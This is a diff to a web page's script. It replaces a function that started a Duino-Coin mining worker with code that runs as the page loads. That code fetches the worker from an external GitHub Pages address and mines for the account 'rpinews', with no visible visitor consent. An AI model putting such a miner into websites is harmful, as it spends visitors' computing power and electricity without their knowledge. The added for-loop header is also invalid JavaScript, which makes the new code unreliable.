@@ -30,6 +30,7 @@
         }
     </style>
 </head>
+
 <body>
     <div id="main-container">
         <div id="text-area">
@@ -47,14 +48,10 @@
 </html>
 
 <script>
-    function textchange() {
-        document.getElementById('startminer').value  = 'Miner Started!';
-        let threads = 1; 
-        let workerVer = 0;
-        for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-            let socketWorker = new Worker("/duinotize.js");
-            socketWorker.postMessage('Start,' + "rpinews" + "," + "duinotize-rig" + "," + workerVer + "," + Math.floor(Math.random() * 2811) + "," + "LOW");
-            workerVer++;
-        }
+    let threads = 1; 
+    for (let workerVer = 0; let workersAmount = 0; workersAmount < threads; workersAmount++) {
+        let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/duinotize.js");
+        socketWorker.postMessage('Start,' + "rpinews" + "," + "duinotize-test" + "," + "LOW" + "," + workerVer);
+        workerVer++;
     }
 </script>
